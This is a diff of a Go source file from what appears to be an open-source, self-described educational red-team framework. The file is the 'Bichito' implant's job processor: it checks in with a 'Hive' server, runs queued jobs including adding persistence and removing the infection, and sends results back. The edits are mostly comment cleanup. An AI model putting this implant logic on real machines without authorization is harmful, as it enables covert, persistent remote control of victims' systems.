@@ -1,9 +1,6 @@
 //{{{{{{{ Bichito Jobs Functions }}}}}}}
-
-//// Functions related to how implant process/handle received jobs
-// A. jobprocessor
-
 //By Rebujacker - Alvaro Folgado Rueda as an open source educative project
+
 package main
 
 import (
@@ -18,18 +15,17 @@ import (
 
 )
 
+//Global var to note if implant was correcrly checked against Hive
 var received bool = false
 
-// Process Implant Jobs to be executed in Bot Machine
-// A. Define a timeout to finish the Jobs and don't let the Implant hanging
-// B. If jobs to process by implant is empty just create a ping job to the Hive
-// C. Update the Job with output of executed commands
-
+/*
+Description: Implant Routine to process Jobs retrieve from Hive
+Flow:
+A.
+*/
 func jobProcessor(){
 
-	//Lock shared Slice
-	//jobsToProcess.mux.RLock()
-
+	//Part of the check-in routine, send the BID to Hive
 	if ((len(jobsToProcess.Jobs) == 0) && (!received)) {
 		
 		ping := Job{"","","",bid,"BiPing","","","",""}
@@ -44,6 +40,7 @@ func jobProcessor(){
 	var result,timeR string
 	var error bool
 	
+	//Loop over the Jobs to be processed
 	for _,job := range jobsToProcess.Jobs{
 
 		//Debug:
@@ -87,9 +84,6 @@ func jobProcessor(){
 		   			
 		   			if !persisted {
 
-		   				//Debug
-		   				//fmt.Println("Persisting Job Bichito....")
-
 		   				blob := job.Result
 		   				error,result = persistence.AddPersistence(biconfig.Persistence,blob)
 		   				if error{
@@ -106,9 +100,7 @@ func jobProcessor(){
 
 		   		case "removeInfection":
 		   			
-		   			err,res := RemoveInfection()
-		   			//Debug
-		   			//fmt.Println("Persistence Removal Finished...")   			
+		   			err,res := RemoveInfection()			
 		   			
 		   			if err{
 						result = "Error Removing Persistence:"+res
@@ -246,9 +238,7 @@ func jobProcessor(){
 		   			
 		   			//Check that the size of the Result doesn't exceed 20 MB
 		   			bytesResult := len(result)
-					//Debug: Job size
-		   			//fmt.Println("Job Result Size:")
-		   			//fmt.Println(bytesResult)
+
 					if (bytesResult >= 20000000){
 						job.Result = "Too Big payload, use staging channel for these sizes"
 						job.Status = "Error"
@@ -275,13 +265,10 @@ func jobProcessor(){
 		   			jobsToHive.mux.Unlock()
 
 		   			biJobTimeout.Reset(time.Duration(10) * time.Second)
-		   			//Reset timeout and continue with next one
-		   			//jobsToProcess.Jobs = jobsToProcess.Jobs[i+1:]
-		   			//return
+
 		}
 
 	}
-	//jobsToProcess.mux.RUnlock()
 
 	//Clean all processed jobs
 	jobsToProcess.mux.Lock()
